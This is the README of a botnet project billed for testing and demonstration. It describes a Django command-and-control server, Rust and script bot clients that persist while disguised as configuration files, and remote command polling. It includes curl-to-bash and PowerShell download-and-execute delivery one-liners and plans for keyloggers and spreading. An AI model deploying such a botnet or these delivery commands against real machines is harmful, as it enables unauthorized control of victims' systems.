# Aura Botnet

C&C Server
---
The botnet's central C&C server utilizes the Django framework as the backend.
It is far from the most efficient web server, but this is offset by the
following:
* Django is extremely portable and therefore good for testing/educational
purposes
* The server is only handling simple POST requests and returning text
* Static files should be handled by a separate web server (local or remote) that
excels in serving static files, such as nginx
* Django includes a very intuitive and useful admin console that can be used for
managing bots and adding commands


The admin console located at `http://your_server:django_port/admin` can be
accessed after setting up the database and a superuser (see below).

Database
---
The Django server is currently configured with a simple setup for mysql. The
current configuration can be changed in the *settings.py* file under
`django-server/aura`. You would, of course, need to setup the database on your
machine. You may wish to switch use postgresql, or even sqlite instead; this
easy to do thanks to Django's database API. More information on configuring this
and the admin console can be found in the following
[tutorial](https://docs.djangoproject.com/en/1.11/intro/tutorial02/)
and [documentation](https://docs.djangoproject.com/en/1.11/ref/databases/).

Bot Client
---
The primary clients for Windows and Linux are written in Rust. Alternate clients
are written in Bash and Powershell. The client will gather relevant system
information and send it to the C&C server to register the new bot.
Identification is done by initially creating a file containing random data --
referred to as the *seed* throughout the code -- which will then be hashed each
time the client runs to identify the client and authenticate with the C&C
server. It will then install all the files in the folder specified in the code,
and initialize the system service or schedule a task with the same privileges
that the client was run with. The default settings have the client and other
files masquerading as configuration files.

Usage
---
You will need Rust installed on the platform that you wish to compile for.
Unfortunately, there is no simple method of cross-compiling that I am aware of.
Go into the client directory (`client/rust-linux` or `client/rust-windows`) and
run:

```
cargo build --release
```

The binary will be sent to `client/rust-*/target/release/`.

The client simply needs to be run in the same folder as any necessary components
(systemd services for Linux clients and launcher.vbs for Powershell) on the
target machine, or installed via web delivery (see below).

Client Web Delivery
---
The *static* folder can be used to store files to be served by a web server --
preferably an nginx server running on a different port or host as your Django
server. You will need to edit the index files, compile, and place the files into
the folders. The simplicity of executing a web delivery makes it easy to
integrate with exploits that run arbitrary code. An example in bash would be:

```
curl http://static-server-name/welcome/linux/rust | bash
```
In Powershell:
```
Invoke-RestMethod http://static-server-name/welcome/windows/rust | powershell
```

This will run the client with the current privileges, install any necessary
files, and cleanup the downloaded files.

Configuring Commands
---
The client periodically communicate with the specified server using POST
requests to receive a command (default is every 5 minutes). Commands can be set
to run for specific bot groups defined by operating system and user privilege.
This is specified in `django-server/groups.json`. The only reserved group
numbers are `-1`, for priority commands that are run by all bots, and `-2`, for
default commands that are run by all bots only if there is no other command to run;
you can also assign commands to individual bots using the hash of their seed.
Each command can be given a start time and end time. Oneshot commands will only
run once on each bot. These can easily be managed through the Django shell or
admin console.

Misc.
---
Because this is for testing purposes, the C&C server needs to be
hard-coded into client and web delivery files. It is currently set to
*localhost* on all the files. This is because an actual botnet would use something
like a domain generation algorithm (DGA) to sync a stream of changing domains on
the client side with a stream of disposable domains being registered -- or just
really bulletproof hosting like the original Mirai botnet.

The code is also not obfuscated nor is there any effort put toward preventing
reverse engineering; this would defeat the purpose of being a botnet for
testing and demonstrations.

Since this is only for testing, I have not implemented any means of spreading.
I may use very controlled means of doing so when I implement support
for client modules.

The *killswitch* folder contains scripts for easy client removal when testing
on your devices.

TODO
---
- Add support for "modules" to be run easily on arbitrary clients. E.g.: Start
an interactive shell, grab arbitrary system files, install keylogger, spread
using various exploits etc.
- Design system to make certain bots into node servers that act as disposable
command and control servers
- Create clients for mobile devices
- Implement compatibility with running C&C server as a hidden Tor service

<h2>This repo is for testing purposes only. This is not meant to be
implemented in any real world applications except for demonstrations.</h2>

